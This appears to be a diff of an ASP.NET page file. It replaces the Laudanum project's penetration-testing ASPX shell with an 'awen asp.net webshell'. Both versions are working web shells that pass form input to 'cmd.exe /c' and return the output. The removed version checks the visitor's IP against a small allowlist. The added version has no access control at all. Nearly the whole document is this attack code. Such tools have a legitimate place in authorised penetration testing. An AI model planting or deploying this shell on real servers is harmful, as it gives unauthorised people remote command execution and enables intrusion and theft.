@@ -1,129 +1,42 @@
-<%@ Page Language="C#"%>
-<%@ Import Namespace="System" %>
-
-<script runat="server">
-
-/* *****************************************************************************
-***
-*** Laudanum Project
-*** A Collection of Injectable Files used during a Penetration Test
-***
-*** More information is available at:
-***  http://laudanum.secureideas.net
-***  laudanum@secureideas.net
-***
-***  Project Leads:
-***         Kevin Johnson <kjohnson@secureideas.net>
-***         Tim Medin <tim@counterhack.com>
-***
-*** Copyright 2014 by Kevin Johnson and the Laudanum Team
-***
-********************************************************************************
-***
-*** This file provides shell access to the system.
-***
-********************************************************************************
-*** This program is free software; you can redistribute it and/or
-*** modify it under the terms of the GNU General Public License
-*** as published by the Free Software Foundation; either version 2
-*** of the License, or (at your option) any later version.
-***
-*** This program is distributed in the hope that it will be useful,
-*** but WITHOUT ANY WARRANTY; without even the implied warranty of
-*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-*** GNU General Public License for more details.
-***
-*** You can get a copy of the GNU General Public License from this
-*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
-*** You can also write to the Free Software Foundation, Inc., 59 Temple
-*** Place - Suite 330, Boston, MA  02111-1307, USA.
-***
-***************************************************************************** */
-
-string stdout = "";
-string stderr = "";
-
-void die() {
-	//HttpContext.Current.Response.Clear();
-	HttpContext.Current.Response.StatusCode = 404;
-	HttpContext.Current.Response.StatusDescription = "Not Found";
-	HttpContext.Current.Response.Write("<h1>404 Not Found</h1>");
-	HttpContext.Current.Server.ClearError();
-	HttpContext.Current.Response.End();
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
 }
-
-void Page_Load(object sender, System.EventArgs e) {
-
-	// Check for an IP in the range we want
-	string[] allowedIps = new string[] {"::1","192.168.0.1", "127.0.0.1"};
-	
-	// check if the X-Fordarded-For header exits
-	string remoteIp;
-	if (HttpContext.Current.Request.Headers["X-Forwarded-For"] == null) {
-		remoteIp = Request.UserHostAddress;
-	} else {
-		remoteIp = HttpContext.Current.Request.Headers["X-Forwarded-For"].Split(new char[] { ',' })[0]; 
-	}
-
-	bool validIp = false;
-	foreach (string ip in allowedIps) {
-		validIp = (validIp || (remoteIp == ip));
-	}
-	
-	if (!validIp) {
-		die();
-	}
-	
-	if (Request.Form["c"] != null) {
-	// do or do not, there is no try
-	//try {
-		// create the ProcessStartInfo using "cmd" as the program to be run, and "/c " as the parameters.
-		// "/c" tells cmd that we want it to execute the command that follows, and exit.
-		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request.Form["c"]);
-
-		// The following commands are needed to redirect the standard output and standard error.
-		procStartInfo.RedirectStandardOutput = true;
-		procStartInfo.RedirectStandardError = true;
-		procStartInfo.UseShellExecute = false;
-		// Do not create the black window.
-		procStartInfo.CreateNoWindow = true;
-		// Now we create a process, assign its ProcessStartInfo and start it
-		System.Diagnostics.Process p = new System.Diagnostics.Process();
-		p.StartInfo = procStartInfo;
-		p.Start();
-		// Get the output and error into a string
-		stdout = p.StandardOutput.ReadToEnd();
-		stderr = p.StandardError.ReadToEnd();
-	//}
-	//catch (Exception objException)
-	//{
-	}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "cmd.exe";
+psi.Arguments = "/c "+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write("</pre>");
 }
 </script>
-<html>
-<head><title>Laundanum ASPX Shell</title></head>
-<body onload="document.shell.c.focus()">
-
-<form method="post" name="shell">
-cmd /c <input type="text" name="c"/>
-<input type="submit"><br/>
-STDOUT:<br/>
-<pre><% = stdout.Replace("<", "&lt;") %></pre>
-<br/>
-<br/>
-<br/>
-STDERR:<br/>
-<pre><% = stderr.Replace("<", "&lt;") %></pre>
-
-
+<HTML>
+<HEAD>
+<title>awen asp.net webshell</title>
+</HEAD>
+<body >
+<form id="cmd" method="post" runat="server">
+<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
+<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
+<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
 </form>
-
-  <hr/>
-  <address>
-  Copyright &copy; 2014, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
-  Written by Tim Medin.<br/>
-  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
-  </address>
-
 </body>
-</html>
+</HTML>
+
+<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
+<!--    http://michaeldaw.org   04/2007    -->
